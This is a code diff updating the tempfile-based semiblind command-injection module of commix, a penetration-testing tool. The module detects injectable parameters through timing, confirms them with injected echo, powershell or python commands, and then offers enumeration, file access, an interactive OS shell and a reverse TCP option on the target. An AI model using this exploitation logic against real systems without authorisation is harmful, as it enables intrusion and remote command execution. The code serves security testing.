@@ -3,7 +3,7 @@
 
 """
 This file is part of commix (@commixproject) tool.
-Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
+Copyright (c) 2014-2016 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix
 
 This program is free software: you can redistribute it and/or modify
@@ -23,8 +23,7 @@ import random
 import base64
 import urllib
 import urllib2
-import readline
-
+  
 from src.utils import menu
 from src.utils import logs
 from src.utils import settings
@@ -43,8 +42,25 @@ from src.core.injections.semiblind.techniques.tempfile_based import tfb_file_acc
 
 from src.core.injections.semiblind.techniques.file_based import fb_injector
 
+readline_error = False
+try:
+  import readline
+except ImportError:
+  if settings.IS_WINDOWS:
+    try:
+      import pyreadline as readline
+    except ImportError:
+      readline_error = True
+  else:
+    try:
+      import gnureadline as readline
+    except ImportError:
+      readline_error = True
+  pass
+
+
 """
-The "tempfile-based" injection technique on Semiblind OS Command Injection.
+The "tempfile-based" injection technique on semiblind OS command injection.
 __Warning:__ This technique is still experimental, is not yet fully functional and may leads to false-positive results.
 """
 
@@ -52,21 +68,26 @@ __Warning:__ This technique is still experimental, is not yet fully functional a
 Delete previous shells outputs.
 """
 def delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
-  settings.SRV_ROOT_DIR = ""
-  cmd = "rm " + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE
+  if settings.TARGET_OS == "win":
+    cmd = settings.WIN_DEL + OUTPUT_TEXTFILE + " " + separator + settings.WIN_COMMENT
+  else: 
+    settings.SRV_ROOT_DIR = ""
+    cmd = settings.DEL + settings.SRV_ROOT_DIR + OUTPUT_TEXTFILE
   response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
 
 """
 The "tempfile-based" injection technique handler
 """
 def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, url_time_response):
-  
   counter = 1
   num_of_chars = 1
   vp_flag = True
   no_result = True
   is_encoded = False
   is_vulnerable = False
+  again_warning = True
+  false_positive_warning = False
+  how_long_statistic = 0
   export_injection_info = False
   how_long = 0
   injection_type = "Semiblind Command Injection"
@@ -78,8 +99,12 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
     
   # Check if defined "--url-reload" option.
   if menu.options.url_reload == True:
-    print Back.RED + "(x) Error: The '--url-reload' option is not available in "+ technique +"!" + Style.RESET_ALL
+    print Back.RED + settings.ERROR_SIGN + "The '--url-reload' option is not available in " + technique + "!" + Style.RESET_ALL
   
+  # percent = str(percent)+ "%"
+  # sys.stdout.write("\r" + settings.INFO_SIGN + "Testing the " + technique + "... " +  "[ " + percent + " ]")
+  # sys.stdout.flush()
+
   # Calculate all possible combinations
   total = (len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES) - len(settings.JUNK_COMBINATION))
     
@@ -103,10 +128,6 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
         
         for output_length in range(1, int(tag_length)):
           try:
-
-            # Log previous 'how_long' for later comparison
-            previous_how_long = how_long
-
             # Tempfile-based decision payload (check if host is vulnerable).
             if alter_shell :
               payload = tfb_payloads.decision_alter_shell(separator, output_length, TAG, OUTPUT_TEXTFILE, delay, http_request_method)
@@ -123,7 +144,7 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
 
             # Check if defined "--verbose" option.
             if menu.options.verbose:
-              sys.stdout.write("\n" + Fore.GREY + "(~) Payload: " + payload.replace("\n", "\\n") + Style.RESET_ALL)
+              sys.stdout.write("\n" + Fore.GREY + settings.PAYLOAD_SIGN + payload.replace("\n", "\\n") + Style.RESET_ALL)
                 
             # Cookie Injection
             if settings.COOKIE_INJECTION == True:
@@ -151,83 +172,141 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
             percent = ((num_of_chars * 100) / total)
             float_percent = "{0:.1f}".format(round(((num_of_chars*100)/(total*1.0)),2))
 
+            # Statistical analysis in time responses.
+            how_long_statistic = how_long_statistic + how_long
+
+            # Reset the how_long_statistic counter
+            if output_length == tag_length - 1:
+              how_long_statistic = 0
+
             if percent == 100 and no_result == True:
               if not menu.options.verbose:
                 percent = Fore.RED + "FAILED" + Style.RESET_ALL
               else:
                 percent = ""
             else:
-              if how_long == previous_how_long + delay:
+              if (url_time_response == 0 and (how_long - delay) >= 0) or \
+                 (url_time_response != 0 and (how_long - delay) == 0 and (how_long == delay)) or \
+                 (url_time_response != 0 and (how_long - delay) > 0 and (how_long >= delay + 1)) :
+
                 # Time relative false positive fixation.
+                false_positive_fixation = False
                 if len(TAG) == output_length:
-                  tmp_how_long = how_long
+                  # Windows targets.
+                  if settings.TARGET_OS == "win":
+                    if how_long > (how_long_statistic / output_length):
+                        false_positive_fixation = True
+                    else:
+                        false_positive_warning = True
+                  # Unix-like targets.
+                  else:
+                    if delay == 1 and (how_long_statistic == delay) or \
+                      delay > 1 and (how_long_statistic == (output_length + delay)) and \
+                      how_long == delay + 1:
+                        false_positive_fixation = True
+                    else:
+                        false_positive_warning = True
+
+                # Identified false positive warning message.
+                if false_positive_warning and again_warning:
+                  again_warning = False
+                  warning_msg = settings.WARNING_SIGN + "Unexpected time delays have been identified due to unstable "
+                  warning_msg += "requests. This behavior which may lead to false-positive results."
+                  sys.stdout.write("\r" + Fore.YELLOW + warning_msg + Style.RESET_ALL)
+                  print ""
+
+                # Check if false positive fixation is True.
+                if false_positive_fixation:
+                  false_positive_fixation = False
+                  settings.FOUND_HOW_LONG = how_long
+                  settings.FOUND_DIFF = how_long - delay
                   randv1 = random.randrange(0, 1)
                   randv2 = random.randrange(1, 2)
                   randvcalc = randv1 + randv2
-                  cmd = "echo $((" + str(randv1) + "+" + str(randv2) + "))"
-                  
-                  # Check for false positive resutls
-                  how_long, output = tfb_injector.false_positive_check(separator, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, randvcalc, alter_shell, how_long)
-                
-                  if str(tmp_how_long) == str(how_long) and \
-                     str(output) == str(randvcalc) and \
-                     len(TAG) == output_length:
-                     
-                    is_vulnerable = True
-                    if not menu.options.verbose:
-                      percent = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
+
+                  if settings.TARGET_OS == "win":
+                    if alter_shell:
+                      cmd = settings.WIN_PYTHON_DIR + "python.exe -c \"print (" + str(randv1) + " + " + str(randv2) + ")\""
                     else:
-                      percent = ""
+                      cmd = "powershell.exe -InputFormat none write (" + str(randv1) + " + " + str(randv2) + ")"
+                  else:
+                    cmd = "echo $((" + str(randv1) + " + " + str(randv2) + "))"
+
+                  # Check for false positive resutls
+                  how_long, output = tfb_injector.false_positive_check(separator, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, randvcalc, alter_shell, how_long, url_time_response)
+
+                  if (url_time_response == 0 and (how_long - delay) >= 0) or \
+                     (url_time_response != 0 and (how_long - delay) == 0 and (how_long == delay)) or \
+                     (url_time_response != 0 and (how_long - delay) > 0 and (how_long >= delay + 1)) :
+                    
+                    if str(output) == str(randvcalc) and len(TAG) == output_length:
+                      is_vulnerable = True
+                      how_long_statistic = 0
+                      if not menu.options.verbose:
+                        percent = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
+                      else:
+                        percent = ""
                   else:
                     break
                 # False positive
                 else:
-                  continue     
+                  if not menu.options.verbose:
+                    percent = str(float_percent)+ "%"
+                    sys.stdout.write("\r" + settings.INFO_SIGN + "Testing the " + technique + "... " +  "[ " + percent + " ]")
+                    sys.stdout.flush()
+                  continue    
               else:
-                percent = str(float_percent)+"%"
-                
+                if not menu.options.verbose:
+                  percent = str(float_percent)+ "%"
+                  sys.stdout.write("\r" + settings.INFO_SIGN + "Testing the " + technique + "... " +  "[ " + percent + " ]")
+                  sys.stdout.flush()
+                continue
             if not menu.options.verbose:
-              sys.stdout.write("\r(*) Testing the "+ technique + "... " +  "[ " + percent + " ]")  
+              sys.stdout.write("\r" + settings.INFO_SIGN + "Testing the " + technique + "... " +  "[ " + percent + " ]")
               sys.stdout.flush()
               
           except KeyboardInterrupt: 
-            # Delete previous shell (text) files (output) from /tmp
-            delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+            if 'cmd' in locals():
+              # Delete previous shell (text) files (output) from temp.
+              delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
             raise
 
           except SystemExit: 
-            # Delete previous shell (text) files (output) from /tmp
+            # Delete previous shell (text) files (output) from temp.
             delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
             raise
 
           except:
             percent = ((num_of_chars * 100) / total)
             float_percent = "{0:.1f}".format(round(((num_of_chars*100)/(total*1.0)),2))
-            if percent == 100:
+            if str(float_percent) == "100.0":
               if no_result == True:
                 if not menu.options.verbose:
                   percent = Fore.RED + "FAILED" + Style.RESET_ALL
-                  sys.stdout.write("\r(*) Testing the "+ technique + "... " +  "[ " + percent + " ]")  
+                  sys.stdout.write("\r" + settings.INFO_SIGN + "Testing the " + technique + "... " +  "[ " + percent + " ]")
                   sys.stdout.flush()
                 else:
                   percent = ""
                 break
               else:
-                percent = str(float_percent)+"%"
+                percent = str(float_percent) + "%"
               #Print logs notification message
               percent = Fore.BLUE + "FINISHED" + Style.RESET_ALL
-              sys.stdout.write("\r(*) Testing the "+ technique + "... " +  "[ " + percent + " ]")  
+              sys.stdout.write("\r" + settings.INFO_SIGN + "Testing the " + technique + "... " +  "[ " + percent + " ]")
               sys.stdout.flush()
               print ""
               logs.logs_notification(filename)
               raise
             else:
-              percent = str(float_percent)+"%"
+              percent = str(float_percent) + "%"
             break
           
           # Yaw, got shellz! 
           # Do some magic tricks!
-          if how_long == previous_how_long + delay:
+          if (url_time_response == 0 and (how_long - delay) >= 0) or \
+             (url_time_response != 0 and (how_long - delay) == 0 and (how_long == delay)) or \
+             (url_time_response != 0 and (how_long - delay) > 0 and (how_long >= delay + 1)) :
+
             if (len(TAG) == output_length) and (is_vulnerable == True):
               found = True
               no_result = False
@@ -268,59 +347,62 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
               counter = counter + 1
               
               # Print the findings to terminal.
-              print Style.BRIGHT + "\n(!) The ("+ http_request_method + ")" + found_vuln_parameter + header_name + the_type + " is vulnerable to "+ injection_type + "." + Style.RESET_ALL
-              print "  (+) Type : "+ Fore.YELLOW + Style.BRIGHT + injection_type + Style.RESET_ALL + ""
-              print "  (+) Technique : "+ Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
-              print "  (+) Payload : "+ Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", payload.replace("\n", "\\n")) + Style.RESET_ALL
+              print Style.BRIGHT + "\n(!) The (" + http_request_method + ")" + found_vuln_parameter + header_name + the_type + " is vulnerable to " + injection_type + "." + Style.RESET_ALL
+              print "  (+) Type : " + Fore.YELLOW + Style.BRIGHT + injection_type + Style.RESET_ALL + ""
+              print "  (+) Technique : " + Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
+              print "  (+) Payload : " + Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", payload.replace("\n", "\\n")) + Style.RESET_ALL
               
+              if settings.TARGET_OS == "win":
+                delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)  
+                time.sleep(1)
+                
               # Check for any enumeration options.
               if settings.ENUMERATION_DONE == True :
                 while True:
                   enumerate_again = raw_input("\n(?) Do you want to enumerate again? [Y/n/q] > ").lower()
                   if enumerate_again in settings.CHOISE_YES:
-                    tfb_enumeration.do_check(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+                    tfb_enumeration.do_check(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
                     break
                   elif enumerate_again in settings.CHOISE_NO: 
                     break
                   elif enumerate_again in settings.CHOISE_QUIT:
-                    # Delete previous shell (text) files (output) from /tmp
+                    # Delete previous shell (text) files (output) from temp.
                     delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)    
                     sys.exit(0)
                   else:
                     if enumerate_again == "":
                       enumerate_again = "enter"
-                    print Back.RED + "(x) Error: '" + enumerate_again + "' is not a valid answer." + Style.RESET_ALL
+                    print Back.RED + settings.ERROR_SIGN + "'" + enumerate_again + "' is not a valid answer." + Style.RESET_ALL + "\n"
                     pass
               else:
-                tfb_enumeration.do_check(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+                tfb_enumeration.do_check(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
 
               # Check for any system file access options.
               if settings.FILE_ACCESS_DONE == True :
                 while True:
-                  file_access_again = raw_input("(?) Do you want to access files again? [Y/n] > ").lower()
+                  file_access_again = raw_input(settings.QUESTION_SIGN + "Do you want to access files again? [Y/n] > ").lower()
                   if file_access_again in settings.CHOISE_YES:
-                    #print ""
-                    tfb_file_access.do_check(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+                    tfb_file_access.do_check(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
                     break
                   elif file_access_again in settings.CHOISE_NO: 
                     break
                   elif file_access_again in settings.CHOISE_QUIT:
-                    # Delete previous shell (text) files (output) from /tmp
+                    # Delete previous shell (text) files (output) from temp.
                     delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                     sys.exit(0)
                   else:
                     if file_access_again == "":
                       file_access_again = "enter"
-                    print Back.RED + "(x) Error: '" + file_access_again + "' is not a valid answer." + Style.RESET_ALL
+                    print Back.RED + settings.ERROR_SIGN + "'" + file_access_again + "' is not a valid answer." + Style.RESET_ALL + "\n"
                     pass
               else:
-                tfb_file_access.do_check(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+                tfb_file_access.do_check(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
               # Check if defined single cmd.
               if menu.options.os_cmd:
-                check_how_long, output = tfb_enumeration.single_os_cmd_exec(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
-                # Exploirt injection result
+                check_how_long, output = tfb_enumeration.single_os_cmd_exec(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
+                # Export injection result
                 tfb_injector.export_injection_results(cmd, separator, output, check_how_long)
-                # Delete previous shell (text) files (output) from /tmp
+                # Delete previous shell (text) files (output) from temp.
                 delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                 sys.exit(0)    
 
@@ -329,21 +411,29 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
                 go_back = False
                 go_back_again = False
                 while True:
-                  # Delete previous shell (text) files (output) from /tmp
+                  # Delete previous shell (text) files (output) from temp.
                   delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                   if menu.options.verbose:
                   	print ""
                   if go_back == True:
                     break
-                  gotshell = raw_input("(?) Do you want a Pseudo-Terminal? [Y/n/q] > ").lower()
+                  gotshell = raw_input(settings.QUESTION_SIGN + "Do you want a Pseudo-Terminal? [Y/n/q] > ").lower()
                   if gotshell in settings.CHOISE_YES:
                     print ""
                     print "Pseudo-Terminal (type '" + Style.BRIGHT + "?" + Style.RESET_ALL + "' for available options)"
+                    if readline_error:
+                      checks.no_readline_module()
                     while True:
                       try:
                         # Tab compliter
-                        readline.set_completer(menu.tab_completer)
-                        readline.parse_and_bind("tab: complete")
+                        if not readline_error:
+                          readline.set_completer(menu.tab_completer)
+                          # MacOSX tab compliter
+                          if getattr(readline, '__doc__', '') is not None and 'libedit' in getattr(readline, '__doc__', ''):
+                            readline.parse_and_bind("bind ^I rl_complete")
+                          # Unix tab compliter
+                          else:
+                            readline.parse_and_bind("tab: complete")
                         cmd = raw_input("""commix(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """)
                         cmd = checks.escaped_cmd(cmd)
                         if cmd.lower() in settings.SHELL_OPTIONS:
@@ -352,16 +442,16 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
                             if no_result == True:
                               return False
                             else:
-                              return True
+                              return True 
                           elif os_shell_option == "quit":  
-                            # Delete previous shell (text) files (output) from /tmp
+                            # Delete previous shell (text) files (output) from temp.
                             delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)                          
                             sys.exit(0)
                           elif os_shell_option == "back":
                             go_back = True
                             break
                           elif os_shell_option == "os_shell": 
-                              print Fore.YELLOW + "(^) Warning: You are already into an 'os_shell' mode." + Style.RESET_ALL + "\n"
+                              print Fore.YELLOW + settings.WARNING_SIGN + "You are already into an 'os_shell' mode." + Style.RESET_ALL + "\n"
                           elif os_shell_option == "reverse_tcp":
                             # Set up LHOST / LPORT for The reverse TCP connection.
                             lhost, lport = reverse_tcp.configure_reverse_tcp()
@@ -379,28 +469,28 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
                                   break
                               # Command execution results.
                               from src.core.injections.results_based.techniques.classic import cb_injector
+                              separator = checks.time_based_separators(separator, http_request_method)
                               whitespace = settings.WHITESPACES[0]
                               response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
                               # Evaluate injection results.
                               shell = cb_injector.injection_results(response, TAG)
                               if menu.options.verbose:
                                 print ""
-                              print Back.RED + "(x) Error: The reverse TCP connection has been failed!" + Style.RESET_ALL
+                              print Back.RED + settings.ERROR_SIGN + "The reverse TCP connection has been failed!" + Style.RESET_ALL
                           else:
                             pass
                         else:
                           print ""
                           # The main command injection exploitation.
-                          check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
-                          # Exploirt injection result
+                          check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
+                          # Export injection result
                           tfb_injector.export_injection_results(cmd, separator, output, check_how_long)
                       except KeyboardInterrupt: 
-                        # Delete previous shell (text) files (output) from /tmp
+                        # Delete previous shell (text) files (output) from temp.
                         delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                         raise
-
                       except SystemExit: 
-                        # Delete previous shell (text) files (output) from /tmp
+                        # Delete previous shell (text) files (output) from temp.
                         delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                         raise
 
@@ -411,25 +501,25 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
                       if no_result == True:
                         return False 
                       else:
-                        # Delete previous shell (text) files (output) from /tmp
+                        # Delete previous shell (text) files (output) from temp.
                         delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                         return True  
                   elif gotshell in settings.CHOISE_QUIT:
-                    # Delete previous shell (text) files (output) from /tmp
+                    # Delete previous shell (text) files (output) from temp.
                     delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                     sys.exit(0)
                   else:
                     if gotshell == "":
                       gotshell = "enter"
-                    print Back.RED + "(x) Error: '" + gotshell + "' is not a valid answer." + Style.RESET_ALL
+                    print Back.RED + settings.ERROR_SIGN + "'" + gotshell + "' is not a valid answer." + Style.RESET_ALL + "\n"
                     pass
               except KeyboardInterrupt: 
-                # Delete previous shell (text) files (output) from /tmp
+                # Delete previous shell (text) files (output) from temp.
                 delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                 raise  
 
               except SystemExit: 
-                # Delete previous shell (text) files (output) from /tmp
+                # Delete previous shell (text) files (output) from temp.
                 delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                 raise 
                 
